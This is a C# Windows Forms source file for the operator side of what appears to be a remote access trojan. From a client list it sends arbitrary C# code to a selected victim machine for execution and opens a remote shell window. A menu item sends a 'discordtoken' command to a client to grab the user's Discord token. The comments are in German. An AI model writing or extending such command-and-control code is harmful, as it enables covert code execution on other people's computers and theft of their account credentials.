using Server.Forms;
using Server.Models;
using System.Windows.Forms;

namespace Server
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            dGV_clients.DataSource = Communication.Network.clientListForDataGridView;
            Communication.Network.Listen();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void pythonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id = GetIdFromEntry();
        }

        private int GetIdFromEntry()
        {
            // Holt sich den Index der ausgewählten Zeile und der ausgewählte Zelle
            int rowIndex = dGV_clients.SelectedCells[0].RowIndex;
            DataGridViewCell selectedCell = dGV_clients.SelectedCells[0];

            // Holt sich den Wert der Zelle, die der ID-Spalte entspricht
            string id = dGV_clients.Rows[rowIndex].Cells["Id"].Value.ToString();
            return Int32.Parse(id);
        }

        private void csharpToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string code = "";
            // Erstellt eine Instanz des OpenFileDialogs
            OpenFileDialog openFileDialog = new OpenFileDialog();

            // Konfiguriert den Dialog, um Textdateien zu öffnen
            openFileDialog.Filter = "Textdateien (*.txt)|*.txt|C#-Dateien (*.cs)|*.cs";
            openFileDialog.Title = "Wähle eine .txt oder .cs datei aus";

            // Zeigt den Dialog an und wartet, bis der Benutzer eine Datei auswählt
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                // Öffnet die ausgewählte Datei und liest den Inhalt als Zeichenfolge
                code = File.ReadAllText(openFileDialog.FileName);
            }

            int id = GetIdFromEntry();

            if (id != 0 && code != "")
            {
                Communication.Network.Send(id, code);
                rTB_chatBox.Text += $"Executet successfully on client {id}\n";
                return;
            }
            MessageBox.Show("Select a entry");

        }

        private void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void chatToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            int id = GetIdFromEntry();

            FrmChat chatForm = new FrmChat(id);
            chatForm.Show();
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            FrmRemoteShell remoteShellForm = new FrmRemoteShell();
            remoteShellForm.Show();
        }

        private void grabDiscordTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int id = GetIdFromEntry();

            string code = "discordtoken";

            if (id != 0)
            {
                Communication.Network.Send(id, code);
                rTB_chatBox.Text += $"Executet successfully on client {id}\n";
                return;
            }
        }
    }
}